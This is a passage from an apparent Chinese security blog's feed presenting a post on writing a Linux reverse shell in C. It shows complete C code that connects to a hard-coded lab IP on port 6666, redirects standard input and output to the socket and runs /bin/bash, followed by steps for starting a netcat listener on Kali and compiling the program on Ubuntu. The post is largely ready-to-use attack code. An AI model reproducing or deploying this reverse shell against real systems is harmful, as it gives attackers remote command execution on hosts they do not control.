class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tcp_port = <span class="number">6666</span>;</span><br><span class="line"><span class="keyword">char</span> *ip = <span class="string">"192.168.17.129"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">                addr.sin_family = AF_INET;</span><br><span class="line">                addr.sin_port = htons(tcp_port);</span><br><span class="line">                addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">                fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> ( connect(fd, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) )&#123;</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dup2(fd, <span class="number">0</span>);</span><br><span class="line">                dup2(fd, <span class="number">1</span>);</span><br><span class="line">                dup2(fd, <span class="number">2</span>);</span><br><span class="line">                execve(<span class="string">"/bin/bash"</span>, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        reverse_shell();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在Kali中开启nc监听：nc -lvp 6666</p><p>在Ubuntu上gcc编译并运行：</p><p><img src="/2019/03/24/C编写实现Linux反弹shell/1.png" alt=""></p><p>在Kali连接到shell了：</p><p><img src="/2019/03/24/C编写实现Linux反弹shell/2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="C/C++" scheme="https://Mi1k7ea.github.com/categories/C-C/"/>
    
    
      <category term="安全开发" scheme="https://Mi1k7ea.github.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="C/C++" scheme="https://Mi1k7ea.github.com/tags/C-C/"/>
    
  </entry>
  
</feed>
